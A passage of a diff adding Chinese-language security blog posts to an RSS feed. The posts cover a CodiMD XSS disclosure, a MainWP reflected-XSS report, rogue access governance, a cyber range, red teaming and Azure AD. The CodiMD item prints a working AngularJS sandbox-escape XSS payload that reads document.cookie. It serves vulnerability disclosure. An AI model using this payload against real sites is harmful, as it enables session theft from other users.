+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;--&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;ng-app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{constructor.constructor(&amp;#39;alert(document.cookie)&amp;#39;)()}}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//sssss&amp;#34; --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
+&lt;/h2&gt;&lt;p&gt;当攻击者与受害者同时编辑同一份文档时，可对所有查看者实施攻击。该漏洞已在最新版CodiMD中修复。&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
+        <title>MainWP成本跟踪器笔记字段中的反射型XSS漏洞分析</title>
+        <link>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 13:25:20 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;反射型xss在成本跟踪器笔记字段中的漏洞报告&#34;&gt;反射型XSS在&amp;quot;成本跟踪器&amp;quot;笔记字段中的漏洞报告
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞描述&#34;&gt;漏洞描述
+&lt;/h2&gt;&lt;p&gt;在MainWP客户端管理面板的&amp;quot;成本跟踪器&amp;quot;模块中，当用户添加或编辑成本时，可以在笔记字段输入任意内容。由于缺乏适当的输入净化和输出编码，如果该输入包含恶意JavaScript（例如XSS有效载荷），将在保存后立即被反射并执行。&lt;/p&gt;
+&lt;p&gt;该脚本不会永久存储在系统中，这证实了它是一个反射型XSS，在当前会话提交后立即触发。&lt;/p&gt;
+&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
+&lt;/h2&gt;&lt;p&gt;该漏洞的存在表明用户输入在反射回HTML响应之前没有经过适当的净化或编码处理。虽然其他用户无法直接利用此漏洞，但可能带来以下影响：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;如果应用程序其他部分存在类似的输入处理方式，这可能成为更严重XSS漏洞的潜在入口点&lt;/li&gt;
+&lt;li&gt;在浏览器扩展、调试工具或集成第三方脚本的环境中，会带来客户端安全风险&lt;/li&gt;
+&lt;li&gt;降低了用户对平台安全编码实践的信任度，特别是在管理多个WordPress站点的管理界面中&lt;/li&gt;
+&lt;li&gt;攻击者可通过访问仪表板（如内部威胁或低权限用户被入侵）来测试或探索更多有效载荷注入点&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2025年6月10日&lt;/strong&gt;：漏洞报告提交&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;同日11:39&lt;/strong&gt;：MainWP团队确认漏洞并标记为&amp;quot;已分类&amp;quot;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;同日16:05&lt;/strong&gt;：MainWP团队发布补丁版本mainwp.zip&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6月11日&lt;/strong&gt;：研究人员反馈补丁未完全修复问题&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6月11日12:04&lt;/strong&gt;：MainWP团队建议清除缓存并重新测试&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6月11日21:41&lt;/strong&gt;：研究人员确认在非Chrome浏览器中漏洞已修复&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6月13日&lt;/strong&gt;：所有五个相关漏洞被标记为已解决，并向研究人员支付50美元奖金&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6月17日&lt;/strong&gt;：漏洞报告被公开披露&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;漏洞类型：反射型跨站脚本(XSS)
+CVE ID：无
+严重程度：低(2.2)
+赏金金额：50美元&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>网络安全经典著作《网络安全管理之道》出版20周年纪念</title>
+        <link>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%8F%E5%85%B8%E8%91%97%E4%BD%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B9%8B%E9%81%93%E5%87%BA%E7%89%8820%E5%91%A8%E5%B9%B4%E7%BA%AA%E5%BF%B5/</link>
+        <pubDate>Wed, 06 Aug 2025 12:19:15 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%8F%E5%85%B8%E8%91%97%E4%BD%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B9%8B%E9%81%93%E5%87%BA%E7%89%8820%E5%91%A8%E5%B9%B4%E7%BA%AA%E5%BF%B5/</guid>
+        <description>&lt;p&gt;2004年7月15日，Addison-Wesley/Pearson出版了我的首部著作《网络安全管理之道：超越入侵检测》。2017年的这篇文章详细解释了我前四本书的差异及创作初衷。&lt;/p&gt;
+&lt;p&gt;时至今日，每当听闻读者从我的书中获益，我仍倍感欣喜。虽然我已不再撰写安全类书籍，但书中核心战术策略依然具有现实意义——这或许并非好事，我本希望这些技术早已过时。按照预期，&amp;ldquo;云计算&amp;quot;等新技术本应解决这些问题。&lt;/p&gt;
+&lt;p&gt;近期CISA红队攻击联邦机构的报告印证了经典观点：&amp;ldquo;红队直接在已攻陷的Solaris和Windows主机上捕获取证数据，这使得攻击者能观测数据收集过程，进而干扰取证、篡改证据文件并调整攻击策略。&amp;ldquo;这正说明：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;不能仅依赖端点检测与响应（EDR）工具监控攻击活动，攻击者可关闭或篡改端点安全工具&lt;/li&gt;
+&lt;li&gt;网络安全管理同样不应在终端采集数据，应通过网络分路器（tap）或镜像端口（span port）进行采集&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;当前这些入侵技术与2004年相比并无本质创新。我在2004年收到实体书时发布的原帖仍值得回味——亲手触摸自己著作的体验无可替代！&lt;/p&gt;
+&lt;p&gt;预计五年后我将再次回顾这一里程碑事件。届时再见！&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>企业安全中的隐形威胁：流氓访问及其治理策略</title>
+        <link>http://localhost:1313/p/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E9%9A%90%E5%BD%A2%E5%A8%81%E8%83%81%E6%B5%81%E6%B0%93%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%85%B6%E6%B2%BB%E7%90%86%E7%AD%96%E7%95%A5/</link>
+        <pubDate>Wed, 06 Aug 2025 11:12:50 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E9%9A%90%E5%BD%A2%E5%A8%81%E8%83%81%E6%B5%81%E6%B0%93%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%85%B6%E6%B2%BB%E7%90%86%E7%AD%96%E7%95%A5/</guid>
+        <description>&lt;h1 id=&#34;企业安全中的隐形威胁流氓访问&#34;&gt;企业安全中的隐形威胁：流氓访问
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;流氓访问&lt;/strong&gt;如同企业安全领域的暗物质：通常不可见且被忽视，但若放任不管则蕴含爆炸性风险。该术语指任何绕过正式审批渠道配置的访问权限，或在合法需求终止后仍保留的访问权限。与孤儿账户不同，流氓访问可能仍处于活跃状态甚至关联已知用户，但缺乏适当的所有权归属、合理性证明或追踪机制——这是脱离治理框架的访问行为。&lt;/p&gt;
+&lt;p&gt;随着组织完善其身份治理与管理（IGA）策略，解决流氓访问已成为优先事项，尤其在审计、合规审查和零信任架构实施过程中至关重要。&lt;/p&gt;
+&lt;h2 id=&#34;访问请求流程与流氓访问的产生节点&#34;&gt;访问请求流程与流氓访问的产生节点
+&lt;/h2&gt;&lt;p&gt;在治理完善的企业中，标准访问流程包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;访问请求（通过自助门户或工单）&lt;/li&gt;
+&lt;li&gt;审批流程（由管理者、应用/权限所有者或双方共同完成）&lt;/li&gt;
+&lt;li&gt;权限配置（自动或手动）&lt;/li&gt;
+&lt;li&gt;认证/重新验证（定期确认或权限移除）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;任何偏离该标准流程、缺乏审计追踪或违反策略的访问行为均被标记为流氓访问。其常见产生节点包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;绕过审批流程（管理员手动添加或影子IT操作）&lt;/li&gt;
+&lt;li&gt;岗位变动后未及时撤销的遗留权限&lt;/li&gt;
+&lt;li&gt;应急访问或项目期间的过度授权&lt;/li&gt;
+&lt;li&gt;离职或工作交接时的权限回收失败&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;流氓访问的识别标准&#34;&gt;流氓访问的识别标准
+&lt;/h2&gt;&lt;p&gt;通过静态指标与行为特征的组合进行判定：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;无关联的访问请求或审批记录&lt;/li&gt;
+&lt;li&gt;所有权不匹配（如权限所有者已不在系统内）&lt;/li&gt;
+&lt;li&gt;与同岗位/部门成员相比存在异常访问模式&lt;/li&gt;
+&lt;li&gt;高权限账户长期无活动（如休眠的root权限）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;现代IGA工具（如SailPoint）内置变更工作流，可识别流氓访问并立即启动修复。这些工具还能利用身份图谱和行为分析进行风险评分，自动标记待审项目或执行修复。&lt;/p&gt;
+&lt;h2 id=&#34;流氓访问与孤儿账户的共生关系&#34;&gt;流氓访问与孤儿账户的共生关系
+&lt;/h2&gt;&lt;p&gt;这两类问题往往相互交织：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;孤儿账户&lt;/strong&gt;：无明确所有者的账户（如承包商遗留的服务账户）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;流氓访问&lt;/strong&gt;：有效用户持有但脱离治理规范的权限（如未经审批手动授予的遗留数据库访问权限）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;二者均违反最小权限和零信任原则。主流IGA平台（SailPoint/Saviynt/Microsoft Entra ID）通过机器学习检测异常访问，实现自动化修复/认证循环。&lt;/p&gt;
+&lt;h2 id=&#34;基于风险的层级化治理方案&#34;&gt;基于风险的层级化治理方案
+&lt;/h2&gt;&lt;p&gt;识别后应按系统关键性分级处理：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;高危系统&lt;/strong&gt;（如AD、ERP、云平台）：24-48小时内撤销访问&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;中危系统&lt;/strong&gt;（含敏感数据的内部应用）：7-10天处理周期&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;低危系统&lt;/strong&gt;（非关键内容的只读访问）：30天处理周期&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;权限优先级应综合考量特权等级、数据分类和角色关键性。已连接应用可通过SCIM/API触发即时修复，未连接系统则需ITSM工单配合升级机制。&lt;/p&gt;
+&lt;h2 id=&#34;合规审计的刚性要求&#34;&gt;合规审计的刚性要求
+&lt;/h2&gt;&lt;p&gt;所有主流审计框架均将流氓访问视为危险信号：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;SOX&lt;/strong&gt;：要求金融系统具备明确的审批和基于角色的访问控制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PCI DSS 4.0&lt;/strong&gt;：强制实施支付环境的最小权限原则&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NIST 800-53&lt;/strong&gt;：强调访问审查、用户问责和权限限制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ISO 27001&lt;/strong&gt;：关注生命周期访问治理和异常检测&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;现实世界中的典型案例&#34;&gt;现实世界中的典型案例
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Snowflake事件（2024）&lt;/strong&gt;：攻击者利用承包商未受监管的高权限凭证窃取客户数据，这些凭证在治理系统中无记录且长期闲置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Twitter事件（2020）&lt;/strong&gt;：社会工程攻击利用数十名员工角色变更后遗留的管理权限，暴露生命周期治理的失效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结论看见不可见守护企业安全&#34;&gt;结论：看见不可见，守护企业安全
+&lt;/h2&gt;&lt;p&gt;流氓访问未必出于恶意，但必然带来风险。它滋生于配置错误、人为失误和流程漏洞的灰色地带，在延迟访问审查或依赖单点认证的环境中尤为猖獗。通过合适的IGA工具、治理策略和风险阈值，企业能在攻击者之前持续检测并处置流氓访问。当今安全领域，忽视不可见威胁绝非选项——那些你看不见的，恰恰可能造成致命伤害。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;关于作者&lt;/strong&gt;&lt;br&gt;
+Durgaprasad Balakrishnan&lt;br&gt;
+拥有16年IT治理、风险与合规经验的信息安全经理，曾领导跨国企业的身份与访问管理项目，擅长制定与业务目标协同的安全战略。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>我们构建了一个网络靶场！ - 免费培训配套的实战演练平台</title>
+        <link>http://localhost:1313/p/%E6%88%91%E4%BB%AC%E6%9E%84%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA-%E5%85%8D%E8%B4%B9%E5%9F%B9%E8%AE%AD%E9%85%8D%E5%A5%97%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83%E5%B9%B3%E5%8F%B0/</link>
+        <pubDate>Wed, 06 Aug 2025 09:45:01 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%88%91%E4%BB%AC%E6%9E%84%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA-%E5%85%8D%E8%B4%B9%E5%9F%B9%E8%AE%AD%E9%85%8D%E5%A5%97%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83%E5%B9%B3%E5%8F%B0/</guid>
+        <description>&lt;h1 id=&#34;我们构建了一个网络靶场&#34;&gt;我们构建了一个网络靶场！
+&lt;/h1&gt;&lt;p&gt;作者：John Strand&lt;/p&gt;
+&lt;p&gt;大家好！&lt;br&gt;
+我想花点时间分享我们与MetaCTF合作的最新成果——&lt;strong&gt;我们构建了一个网络靶场&lt;/strong&gt;！&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/services/cyber-range/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;点击查看详情&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;虽然这听起来可能不够吸引人，但这个平台有几个独特优势：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;永久免费访问&lt;/strong&gt;&lt;br&gt;
+所有购买WWHF在线培训的学员均可永久免费使用靶场资源&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://wildwesthackinfest.com/deadwood/training/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;培训课程列表&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;突破传统培训限制&lt;/strong&gt;&lt;br&gt;
+我们厌恶那些只能在课堂期间使用的实验环境。网络安全需要持续技能升级，而网络靶场正是最佳解决方案，也能帮助缓解PPT教学带来的疲劳感。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;动态更新的挑战库&lt;/strong&gt;&lt;br&gt;
+我们持续添加新挑战任务，最新批次已上线：&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/services/cyber-range/cyber-range-updates/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;挑战更新日志&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;视频教学深度整合&lt;/strong&gt;&lt;br&gt;
+BHIS YouTube频道新增教学视频与靶场挑战直接关联。当你在挑战中遇到困难时，可通过对应视频获取详细技术解析。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;精选配套课程&#34;&gt;精选配套课程
+&lt;/h3&gt;&lt;p&gt;想向John Strand本人学习更多实战技能？推荐以下课程：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SOC核心技能&lt;/li&gt;
+&lt;li&gt;主动防御与网络欺骗&lt;/li&gt;
+&lt;li&gt;基于MITRE ATT&amp;amp;CK的安防入门&lt;/li&gt;
+&lt;li&gt;渗透测试基础&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;（提供直播/点播多种学习方式）&lt;/p&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;平台特色：将枯燥的理论知识与可重复实践的虚拟环境相结合，通过持续更新的攻防场景帮助安全从业者保持技术敏锐度。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>红队测试详解：网络安全攻防演练的核心技术</title>
+        <link>http://localhost:1313/p/%E7%BA%A2%E9%98%9F%E6%B5%8B%E8%AF%95%E8%AF%A6%E8%A7%A3%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</link>
+        <pubDate>Wed, 06 Aug 2025 09:11:54 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%BA%A2%E9%98%9F%E6%B5%8B%E8%AF%95%E8%AF%A6%E8%A7%A3%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</guid>
+        <description>&lt;h1 id=&#34;什么是红队测试&#34;&gt;什么是红队测试？
+&lt;/h1&gt;&lt;p&gt;红队测试是一种采用对抗性方法严格挑战计划、策略、系统和假设的实践。红队可能由外部签约团队、内部小组或内外结合的团队组成，通过特定策略和战术提供外部视角。&lt;/p&gt;
+&lt;h2 id=&#34;核心目标&#34;&gt;核心目标
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;克服群体思维和确认偏误等认知错误&lt;/li&gt;
+&lt;li&gt;验证现有检测、预防和缓解措施对各种攻击向量的有效性&lt;/li&gt;
+&lt;li&gt;模拟恶意行为者突破企业数字防御的全过程&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;红蓝队对抗机制&#34;&gt;红蓝队对抗机制
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;红队&lt;/strong&gt;：模拟攻击方，尝试突破企业安全防线&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;蓝队&lt;/strong&gt;：模拟防御方，负责阻止红队的模拟攻击（如数据泄露、钓鱼攻击）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;紫队&lt;/strong&gt;：双方信息共享形成的协作模式（如图1所示）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;与渗透测试的区别&#34;&gt;与渗透测试的区别
+&lt;/h2&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;维度&lt;/th&gt;
+          &lt;th&gt;渗透测试&lt;/th&gt;
+          &lt;th&gt;红队测试&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;目标&lt;/td&gt;
+          &lt;td&gt;评估安全控制有效性&lt;/td&gt;
+          &lt;td&gt;测试系统/人员响应能力&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;执行方式&lt;/td&gt;
+          &lt;td&gt;公开已知测试范围&lt;/td&gt;
+          &lt;td&gt;隐蔽突袭式测试&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;蓝队知晓度&lt;/td&gt;
+          &lt;td&gt;提前告知测试细节&lt;/td&gt;
+          &lt;td&gt;完全不知情&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;持续时间&lt;/td&gt;
+          &lt;td&gt;短期针对性测试&lt;/td&gt;
+          &lt;td&gt;长期持续性演练&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;红队实施方法论&#34;&gt;红队实施方法论
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;前期评估&lt;/strong&gt;：识别潜在攻击入口和漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;目标设定&lt;/strong&gt;：明确关键攻击目标（如核心服务器）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;攻击执行&lt;/strong&gt;：采用真实攻击技术（包括：
+&lt;ul&gt;
+&lt;li&gt;防火墙/IDS/IPS绕过&lt;/li&gt;
+&lt;li&gt;钓鱼攻击与社会工程学&lt;/li&gt;
+&lt;li&gt;物理安全渗透测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果分析&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;蓝队提供威胁指标(IoC)检测报告&lt;/li&gt;
+&lt;li&gt;红队披露战术技术流程(TTPs)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;改进措施&lt;/strong&gt;：生成防火墙升级等具体整改方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;ai技术赋能&#34;&gt;AI技术赋能
+&lt;/h2&gt;&lt;p&gt;人工智能正在提升红队测试的：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击向量识别效率&lt;/li&gt;
+&lt;li&gt;演练结果分析深度&lt;/li&gt;
+&lt;li&gt;威胁响应速度&lt;/li&gt;
+&lt;li&gt;大型语言模型安全测试能力&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;实施注意事项&#34;&gt;实施注意事项
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;必须获得管理层支持&lt;/li&gt;
+&lt;li&gt;合理控制测试成本&lt;/li&gt;
+&lt;li&gt;确保资源充足性&lt;/li&gt;
+&lt;li&gt;严格限定测试范围&lt;/li&gt;
+&lt;li&gt;建立完整的复盘机制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;通过红蓝对抗演练，企业可有效发现安全体系中的薄弱环节，提升整体网络安全防护水平。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>深入解析Azure Active Directory：微软云身份认证的核心架构</title>
+        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90azure-active-directory%E5%BE%AE%E8%BD%AF%E4%BA%91%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/</link>
+        <pubDate>Wed, 06 Aug 2025 08:06:05 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90azure-active-directory%E5%BE%AE%E8%BD%AF%E4%BA%91%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/</guid>
+        <description>&lt;h1 id=&#34;什么是azure-active-directory&#34;&gt;什么是Azure Active Directory？
+&lt;/h1&gt;&lt;p&gt;许多人都熟悉Windows Server中的本地目录和认证系统——Active Directory，但Azure Active Directory究竟是什么？Azure Active Directory（Azure AD或AAD）是一个多租户云目录和认证服务。它是Office 365（和Azure）用于账户、组和角色的目录服务，同时也是一个支持联合认证（SAML等）的身份提供者（IdP）。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：鉴于云技术的快速变化，本文部分内容可能在发布后不久就会过时。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;azure-ad的高可用性架构&#34;&gt;Azure AD的高可用性架构
+&lt;/h2&gt;&lt;p&gt;Azure AD具有极高的可用性和全球部署能力：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在全球30多个数据中心部署，并利用Azure可用区&lt;/li&gt;
+&lt;li&gt;数据写入后至少会复制到4个（最多13个）数据中心&lt;/li&gt;
+&lt;li&gt;每个数据中心内数据至少复制9次以实现持久性和负载均衡&lt;/li&gt;
+&lt;li&gt;系统定期进行故障注入测试，甚至模拟整个数据中心宕机&lt;/li&gt;
+&lt;li&gt;目前运行在超过30万个CPU核心上，每周处理超过11PB的监控数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;azure-ad不是云版本的ad&#34;&gt;Azure AD不是云版本的AD
+&lt;/h2&gt;&lt;p&gt;Azure Active Directory并不是托管在云端的Active Directory。它不支持传统的AD认证方法（如NTLM或Kerberos）、没有LDAP协议，也不支持组策略（GPO），因此不适用于传统的本地应用程序。&lt;/p&gt;
+&lt;p&gt;微软Azure（Azure Active Directory Domain Services）、亚马逊AWS（Amazon Managed Microsoft AD）和谷歌云（Managed Service for Microsoft AD）都提供可以用于管理云工作负载的托管Active Directory环境。这些环境都有2个或更多域控制器，租户管理员不会获得域管理员权限，只能获得特定OU和GPO的委派管理权限。&lt;/p&gt;
